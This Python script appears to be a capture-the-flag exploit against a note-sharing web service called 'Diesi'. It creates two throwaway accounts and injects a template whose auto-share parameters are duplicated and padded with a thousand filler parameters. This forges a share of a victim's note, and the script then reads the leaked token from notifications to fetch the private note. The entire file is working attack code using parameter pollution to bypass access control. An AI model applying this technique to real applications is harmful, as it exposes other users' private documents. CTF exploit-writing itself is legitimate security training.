#!/usr/bin/env python3

import json
import random
import string
import sys
import time
import re
import base64

from interactions import Diesi


def exploit(host: str, flag_id: str) -> str:
    flag_id_d = json.loads(flag_id)
    flag_username, flag_note_id = flag_id_d['username'], int(flag_id_d['note_id'])

    client1 = Diesi(host)

    username1 = ''.join(random.choices(string.ascii_letters, k=16))
    password1 = ''.join(random.choices(string.ascii_letters, k=16))
    client1.register_checked(username1, password1)

    client2 = Diesi(host)

    username2 = ''.join(random.choices(string.ascii_letters, k=16))
    password2 = ''.join(random.choices(string.ascii_letters, k=16))
    client2.register_checked(username2, password2)
    
    def int_to_str(i):
        alphabet = string.ascii_letters + string.digits
        base = len(alphabet)
        s = ''
        while i:
            s += alphabet[i % base]
            i //= base
        return s

    filler = ''.join([f'&{int_to_str(i)}=' for i in range(1000)])

    print(len(filler))
    r = client1.create_template('title', f'''
{{auto_share=[to_user={username2}&from_user={username1}&from.user={flag_username}&doc_id=x&doc.id={flag_note_id}&message=msg{filler}]}}
''')

    m = re.search(r'option value="([0-9]+)">title', r.text)
    template_id = m.group(1)

    print(f'Created template {template_id}')

    r = client1.write('title', 'body', template_id)
    document_id = r.url.split('id=')[-1]

    print(f'Created document {document_id}')

    r = client2.notifications()
    
    token = r.json()['notifications'][0].split('token=')[1].split("'>")[0]

    print(f'Extracted token {token}')

    r = client2.read_shared(token)

    print(r.text)

if __name__ == '__main__':
    host, flag_id = sys.argv[1:3]
    flag = exploit(host, flag_id)
    print(flag)
